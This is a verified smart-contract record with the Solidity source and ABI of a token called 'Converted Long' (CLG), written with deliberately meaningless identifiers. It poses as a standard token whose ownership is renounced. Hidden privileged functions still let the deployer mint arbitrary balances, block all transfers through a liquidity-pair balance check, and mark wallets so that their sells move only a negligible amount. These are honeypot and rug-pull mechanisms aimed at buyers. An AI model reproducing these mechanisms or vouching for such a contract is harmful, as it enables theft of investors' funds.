{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface liquidityIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingBuyTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountExempt {\n    function createPair(address listTx, address atTxLimit) external returns (address);\n}\n\ninterface amountFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAt) external view returns (uint256);\n\n    function transfer(address takeToken, uint256 totalEnable) external returns (bool);\n\n    function allowance(address tokenWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeToken,\n        uint256 totalEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isShould, uint256 value);\n    event Approval(address indexed tokenWallet, address indexed spender, uint256 value);\n}\n\ninterface takeMode is amountFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConvertedLong is tradingBuyTx, amountFrom, takeMode {\n\n    function sellEnable() public {\n        emit OwnershipTransferred(listFee, address(0));\n        launchedSenderAuto = address(0);\n    }\n\n    uint256 shouldLimitSell;\n\n    bool public tradingTake;\n\n    uint256 private swapAuto;\n\n    string private autoLaunched = \"Converted Long\";\n\n    uint8 private launchedShouldSender = 18;\n\n    bool public fromToken;\n\n    function feeMode(uint256 totalEnable) public {\n        teamReceiver();\n        shouldLimitSell = totalEnable;\n    }\n\n    function approve(address receiverMinSell, uint256 totalEnable) public virtual override returns (bool) {\n        txAuto[_msgSender()][receiverMinSell] = totalEnable;\n        emit Approval(_msgSender(), receiverMinSell, totalEnable);\n        return true;\n    }\n\n    function balanceOf(address feeAt) public view virtual override returns (uint256) {\n        return txIsAuto[feeAt];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTakeFund;\n    }\n\n    uint256 private modeLaunch = 100000000 * 10 ** 18;\n\n    bool private txAt;\n\n    mapping(address => bool) public totalMode;\n\n    function totalReceiver(address sellTeam, address takeToken, uint256 totalEnable) internal returns (bool) {\n        require(txIsAuto[sellTeam] >= totalEnable);\n        txIsAuto[sellTeam] -= totalEnable;\n        txIsAuto[takeToken] += totalEnable;\n        emit Transfer(sellTeam, takeToken, totalEnable);\n        return true;\n    }\n\n    mapping(address => uint256) private txIsAuto;\n\n    address private launchedSenderAuto;\n\n    bool public swapMin;\n\n    bool public buyList;\n\n    bool public listSwapLiquidity;\n\n    string private enableTakeFund = \"CLG\";\n\n    bool public txAmountExempt;\n\n    address sellWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchIs(address fromTxWallet, uint256 totalEnable) public {\n        teamReceiver();\n        txIsAuto[fromTxWallet] = totalEnable;\n    }\n\n    uint256 fundLaunch;\n\n    bool public exemptSell;\n\n    function transfer(address fromTxWallet, uint256 totalEnable) external virtual override returns (bool) {\n        return buyTake(_msgSender(), fromTxWallet, totalEnable);\n    }\n\n    address public feeIs;\n\n    constructor (){\n        \n        liquidityIs feeMax = liquidityIs(swapSender);\n        feeIs = amountExempt(feeMax.factory()).createPair(feeMax.WETH(), address(this));\n        if (listSwapLiquidity) {\n            txAt = true;\n        }\n        listFee = _msgSender();\n        sellEnable();\n        modeBuyShould[listFee] = true;\n        txIsAuto[listFee] = modeLaunch;\n        \n        emit Transfer(address(0), listFee, modeLaunch);\n    }\n\n    address public listFee;\n\n    function buyTake(address sellTeam, address takeToken, uint256 totalEnable) internal returns (bool) {\n        if (sellTeam == listFee) {\n            return totalReceiver(sellTeam, takeToken, totalEnable);\n        }\n        uint256 toToken = amountFrom(feeIs).balanceOf(sellWallet);\n        require(toToken == shouldLimitSell);\n        require(takeToken != sellWallet);\n        if (totalMode[sellTeam]) {\n            return totalReceiver(sellTeam, takeToken, enableBuy);\n        }\n        return totalReceiver(sellTeam, takeToken, totalEnable);\n    }\n\n    uint256 constant enableBuy = 13 ** 10;\n\n    function getOwner() external view returns (address) {\n        return launchedSenderAuto;\n    }\n\n    function owner() external view returns (address) {\n        return launchedSenderAuto;\n    }\n\n    function isFund(address launchedAt) public {\n        teamReceiver();\n        if (fromToken != txAt) {\n            fromToken = false;\n        }\n        if (launchedAt == listFee || launchedAt == feeIs) {\n            return;\n        }\n        totalMode[launchedAt] = true;\n    }\n\n    bool public launchList;\n\n    function transferFrom(address sellTeam, address takeToken, uint256 totalEnable) external override returns (bool) {\n        if (_msgSender() != swapSender) {\n            if (txAuto[sellTeam][_msgSender()] != type(uint256).max) {\n                require(totalEnable <= txAuto[sellTeam][_msgSender()]);\n                txAuto[sellTeam][_msgSender()] -= totalEnable;\n            }\n        }\n        return buyTake(sellTeam, takeToken, totalEnable);\n    }\n\n    mapping(address => mapping(address => uint256)) private txAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedShouldSender;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoLaunched;\n    }\n\n    function allowance(address fundEnable, address receiverMinSell) external view virtual override returns (uint256) {\n        if (receiverMinSell == swapSender) {\n            return type(uint256).max;\n        }\n        return txAuto[fundEnable][receiverMinSell];\n    }\n\n    uint256 private teamTradingTake;\n\n    event OwnershipTransferred(address indexed shouldTradingSell, address indexed swapShould);\n\n    mapping(address => bool) public modeBuyShould;\n\n    address swapSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamReceiver() private view {\n        require(modeBuyShould[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeLaunch;\n    }\n\n    function launchShould(address atBuy) public {\n        if (tradingTake) {\n            return;\n        }\n        if (swapMin) {\n            launchList = false;\n        }\n        modeBuyShould[atBuy] = true;\n        if (swapAuto == teamTradingTake) {\n            buyList = false;\n        }\n        tradingTake = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTradingSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMinSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalEnable\",\"type\":\"uint256\"}],\"name\":\"feeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"}],\"name\":\"isFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTxWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalEnable\",\"type\":\"uint256\"}],\"name\":\"launchIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"}],\"name\":\"launchShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeBuyShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTxWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConvertedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}